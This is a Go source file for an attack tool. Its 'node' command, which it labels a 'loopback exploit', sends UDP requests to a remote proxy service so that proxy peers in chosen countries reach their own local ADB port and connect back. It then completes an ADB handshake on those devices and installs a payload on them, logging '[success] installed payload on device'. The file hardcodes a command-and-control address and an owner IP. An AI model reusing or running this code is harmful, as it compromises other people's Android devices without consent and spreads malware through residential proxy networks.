package main

import (
	"android/internal/adb"
	"android/internal/bytebuf"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strconv"
	"time"

	"github.com/spf13/cobra"
)

type ProxyPeerRequest struct {
	Magic    uint32
	Protocol uint8
	StreamId uint64

	SessionId  uint64
	SessionTtl uint32

	Country   string
	State     string
	City      string
	Continent string

	ASN         uint32
	GatewayAddr string
	GatewayPort uint16
	TargetAddr  string
	TargetPort  uint16
}

type ProxyConnectRequest struct {
	Type          uint8  // always 0
	Port          uint16 // 5555
	BufferSize    uint16 // 1500
	AllowLoopback uint8  // 1
	Address       string // address string
}

type Header struct {
	Magic    uint32
	Version  uint8
	Opcode   uint8
	Id       uint32
	Length   uint32
	Checksum uint32
}

var (
	cncAddress        = "104.194.10.224:6969"
	listenerPort      = 1111
	muxadoStreamDelay = 100 * time.Millisecond
	targetCountries   = []string{"any"}
	ownAddress        = "185.244.104.201"
)

var nodeCmd = &cobra.Command{
	Use:   "node",
	Short: "loopback exploit thing but with proxy node.",
	Run:   runNode,
}

func init() {
	rootCmd.AddCommand(nodeCmd)

	nodeCmd.Flags().IntVarP(&listenerPort, "listener", "l", listenerPort, "Listener to use")
	nodeCmd.Flags().StringVarP(&cncAddress, "address", "a", cncAddress, "Proxy node to use")
	nodeCmd.Flags().StringSliceVarP(&targetCountries, "countries", "c", targetCountries, "Target countries")
	nodeCmd.Flags().DurationVarP(&muxadoStreamDelay, "stream-delay", "s", muxadoStreamDelay, "Delay between next request")
	nodeCmd.Flags().StringVarP(&ownAddress, "owner", "o", ownAddress, "Owner address")
}

func runNode(cmd *cobra.Command, args []string) {
	if err := loadSigner("auth.key"); err != nil {
		log.Println("Reading key failed, make sure there is a auth.key")
		return
	}

	go func() {
		meow, err := net.Listen("tcp", ":"+strconv.Itoa(listenerPort))
		if err != nil {
			return
		}

		for {
			accept, err := meow.Accept()
			if err != nil {
				return
			}

			go handleNodeConnection(accept)
		}
	}()

	for i := 0; i < globalThreads; i++ {
		go func() {
			for {
				doNodeRequest(cncAddress)
				time.Sleep(1 * time.Millisecond)
			}
		}()
	}

	select {}
}

func handleNodeConnection(conn net.Conn) {
	defer conn.Close()

	// read stream id bytes ot ignore them
	streamIdBytes := make([]byte, 8)
	_, _ = conn.Read(streamIdBytes)

	c := adb.NewClient(conn)
	c.SetSigner(rsaSigner)

	// handshake
	name, model, err := c.Handshake()
	if err != nil {
		return
	}

	// handle
	if err := handlePayload(c); err == nil {
		fmt.Printf("[success] installed payload on device '%s' (%s)\n", name, model)
	}
}

func doNodeRequest(prx string) {
	remoteAddr, err := net.ResolveUDPAddr("udp", "117.55.202.224:1361")
	if err != nil {
		fmt.Println("Resolve remote error:", err)
		return
	}

	conn, err := net.DialUDP("udp", nil, remoteAddr)
	if err != nil {
		fmt.Println("Dial error:", err)
		return
	}
	defer conn.Close()

	buf := bytebuf.New()
	_ = buf.Serialize(&ProxyPeerRequest{
		Magic:      0xD34DB33F,
		Protocol:   0,
		StreamId:   0,
		SessionId:  0,
		SessionTtl: 0,
		Country:    targetCountries[rand.Intn(len(targetCountries))],

		GatewayAddr: ownAddress,
		GatewayPort: uint16(listenerPort),

		TargetAddr: "127.0.0.1",
		TargetPort: uint16(globalPorts[rand.Intn(len(globalPorts))]),
	})

	data := bytebuf.New()
	data.AddBuffer(buf)

	_, _ = conn.Write(data.Bytes())
}
